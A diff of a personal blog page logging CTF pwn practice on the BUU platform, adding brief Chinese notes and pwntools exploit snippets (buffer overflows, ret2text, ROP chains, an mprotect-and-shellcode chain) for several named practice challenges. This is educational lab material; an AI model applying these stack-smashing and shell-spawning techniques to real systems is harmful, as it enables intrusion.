@@ -26,11 +26,13 @@
 <meta property="og:site_name" content="TY&#39;s Blog">
 <meta property="og:description" content="Record the learning of pwn on buu">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://tforevery.github.io/Images/image-20250402110148554.png">
 <meta property="article:published_time" content="2025-04-01T05:11:53.000Z">
-<meta property="article:modified_time" content="2025-04-01T08:20:01.365Z">
+<meta property="article:modified_time" content="2025-04-02T03:17:16.371Z">
 <meta property="article:author" content="TY">
 <meta property="article:tag" content="Buu">
 <meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://tforevery.github.io/Images/image-20250402110148554.png">
   
   
   
@@ -236,7 +238,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          298 字
+          583 字
         
       </span>
     
@@ -247,7 +249,7 @@
         
         
         
-          3 分钟
+          5 分钟
         
       </span>
     
@@ -341,7 +343,7 @@
               <p id="updated-time" class="note note-info" style="">
                 
                   
-                    本文最后更新于 2025年4月1日 下午
+                    本文最后更新于 2025年4月2日 上午
                   
                 
               </p>
@@ -370,6 +372,7 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> struct<br><br>decimal = <span class="hljs-number">5.625</span><br>hexadecimal = <span class="hljs-built_in">hex</span>(struct.unpack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, struct.pack(<span class="hljs-string">&#x27;&lt;f&#x27;</span>, decimal))[<span class="hljs-number">0</span>])<br><span class="hljs-built_in">print</span>(hexadecimal)<br></code></pre></td></tr></table></figure>
 
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 判断</span><br>payload = (<span class="hljs-number">0x30</span>-<span class="hljs-number">4</span>)*<span class="hljs-string">b&#x27;a&#x27;</span>+ p(<span class="hljs-number">0x41348000</span>)[:<span class="hljs-number">4</span>]<br>s(payload)<br><br>inter()<br></code></pre></td></tr></table></figure>
+
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># backdoor</span><br>payload = (<span class="hljs-number">0x30</span>+<span class="hljs-number">8</span>)*<span class="hljs-string">b&#x27;a&#x27;</span>+ p(<span class="hljs-number">0x004006BE</span>)<br>s(payload)<br><br>inter()<br></code></pre></td></tr></table></figure>
 
 <h1 id="pwn1-sctf-2016"><a href="#pwn1-sctf-2016" class="headerlink" title="pwn1_sctf_2016"></a>pwn1_sctf_2016</h1><blockquote>
@@ -377,10 +380,12 @@
 <p>打Ret2Text即可，存在backdoor</p>
 </blockquote>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">payload = <span class="hljs-string">b&#x27;I&#x27;</span>*(((<span class="hljs-number">0x3c</span>+<span class="hljs-number">8</span>)//<span class="hljs-number">3</span>)-<span class="hljs-number">1</span>)+<span class="hljs-string">b&#x27;a&#x27;</span> +p(elf.sym[<span class="hljs-string">&#x27;get_flag&#x27;</span>])<br>sl(payload)<br><br>inter()<br></code></pre></td></tr></table></figure>
+
 <h1 id="jarvisoj-level0"><a href="#jarvisoj-level0" class="headerlink" title="jarvisoj_level0"></a>jarvisoj_level0</h1><blockquote>
 <p>打Ret2Text即可，存在backdoor</p>
 </blockquote>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">Ret = <span class="hljs-number">0x004005A5</span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x80</span>+<span class="hljs-number">8</span>)+p(Ret) +p(elf.sym[<span class="hljs-string">&#x27;callsystem&#x27;</span>])<br>sl(payload)<br><br>inter()<br></code></pre></td></tr></table></figure>
+
 <h1 id="第五空间2019决赛-PWN5"><a href="#第五空间2019决赛-PWN5" class="headerlink" title="[第五空间2019决赛]PWN5"></a>[第五空间2019决赛]PWN5</h1><blockquote>
 <p>存在fmt，直接利用fmt修改pwd即可</p>
 </blockquote>
@@ -390,6 +395,47 @@
 <p>有system,sh，传参即可</p>
 </blockquote>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">sh = <span class="hljs-number">0x0804A024</span><br>system = <span class="hljs-number">0x0804849E</span><br>payload = (<span class="hljs-number">0x88</span>+<span class="hljs-number">4</span>)*<span class="hljs-string">b&#x27;a&#x27;</span> + p(system) + p(sh)<br>sl(payload)<br>inter()<br></code></pre></td></tr></table></figure>
+
+<h1 id="ciscn-2019-n-8"><a href="#ciscn-2019-n-8" class="headerlink" title="ciscn_2019_n_8"></a>ciscn_2019_n_8</h1><blockquote>
+<p>注意数据类型即可</p>
+</blockquote>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs py">payload = p(<span class="hljs-number">17</span>)*<span class="hljs-number">14</span><br>sl(payload)<br>inter()<br></code></pre></td></tr></table></figure>
+
+<h1 id="bjdctf-2020-babystack"><a href="#bjdctf-2020-babystack" class="headerlink" title="bjdctf_2020_babystack"></a>bjdctf_2020_babystack</h1><blockquote>
+<p>自定义输入长度，存在backdoor，打Ret2Text</p>
+</blockquote>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs py">sl(<span class="hljs-built_in">str</span>(<span class="hljs-number">0x20</span>))<br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span> + p(elf.sym[<span class="hljs-string">&#x27;backdoor&#x27;</span>])<br>sl(payload)<br>inter()<br></code></pre></td></tr></table></figure>
+
+<h1 id="jarvisoj-level2-x64"><a href="#jarvisoj-level2-x64" class="headerlink" title="jarvisoj_level2_x64"></a>jarvisoj_level2_x64</h1><blockquote>
+<p>x64传参问题，rdi传参即可</p>
+</blockquote>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs py">rdiRet = <span class="hljs-number">0x00000000004006b3</span><br>system = <span class="hljs-number">0x040063E</span><br>sh = <span class="hljs-number">0x00600A90</span><br>payload = <span class="hljs-number">0x88</span> * <span class="hljs-string">b&#x27;a&#x27;</span> + p(rdiRet) + p(sh) + p(system)<br>sl(payload)<br>inter()<br></code></pre></td></tr></table></figure>
+
+<h1 id="get-started-3dsctf-2016"><a href="#get-started-3dsctf-2016" class="headerlink" title="get_started_3dsctf_2016"></a>get_started_3dsctf_2016</h1><blockquote>
+<p>静态编译，这道题应该是设置了alarm<del>很抽象的是（没找到）</del>，而且这个时间不足以支撑putchar将flag打印出来，那么换个思路打mportect（静态一般都会有，实在没有再考虑libc，syscall）</p>
+<p>我这里用的是栈传参，重复利用main函数达成控制程序流的效果</p>
+<p>用寄存器弹掉参数也可以的</p>
+</blockquote>
+<p><img src="/../Images/image-20250402110148554.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs py">mprotect = <span class="hljs-number">0x0806EC80</span><br>sh = <span class="hljs-number">0x080EB000</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x38</span><br>payload += p(mprotect) + p(<span class="hljs-number">0x08048A2F</span>) + p(sh) + p(<span class="hljs-number">0x1000</span>) + p(<span class="hljs-number">7</span>)<br>sl(payload)<br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x38</span><br>payload += p(<span class="hljs-number">0x0804F630</span>) + p(sh) + p(sh)<br>sl(payload)<br><br>shellcode = asm(shellcraft.sh())<br>sl(shellcode)<br>inter()<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs py">mprotect = <span class="hljs-number">0x0806EC80</span><br>sh = <span class="hljs-number">0x080EB000</span><br>pop_3_Junk = <span class="hljs-number">0x0806fc30</span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x38</span><br>payload += p(mprotect) + p(pop_3_Junk) + p(sh) + p(<span class="hljs-number">0x1000</span>) + p(<span class="hljs-number">7</span>)<br>payload += p(<span class="hljs-number">0x0804F630</span>) + p(sh) + p(sh)<br>sl(payload)<br><br>shellcode = asm(shellcraft.sh())<br>sl(shellcode)<br>inter()<br></code></pre></td></tr></table></figure>
+
+<h1 id="HarekazeCTF2019-baby-rop"><a href="#HarekazeCTF2019-baby-rop" class="headerlink" title="[HarekazeCTF2019]baby_rop"></a>[HarekazeCTF2019]baby_rop</h1><blockquote>
+<p>amd64传参问题，存在sh和system，直接打Ret2Text</p>
+</blockquote>
+<blockquote>
+<p>rdi</p>
+<p>rsi</p>
+<p>rdx</p>
+<p>rcx</p>
+<p>r8</p>
+<p>r9</p>
+<p>栈</p>
+</blockquote>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs py">system = elf.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>sh = <span class="hljs-number">0x000601048</span><br>rdiRet = <span class="hljs-number">0x0000000000400683</span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span><br>payload += p(rdiRet) + p(sh) + p(system)<br>sl(payload)<br>inter()<br></code></pre></td></tr></table></figure>
+
+
                 
               </div>
             
@@ -478,6 +524,12 @@
                 <div class="post-prevnext my-3">
                   <article class="post-prev col-6">
                     
+                    
+                      <a href="/Record-Topic/" title="Record-Topic">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Record-Topic</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
                     
                   </article>
                   <article class="post-next col-6">
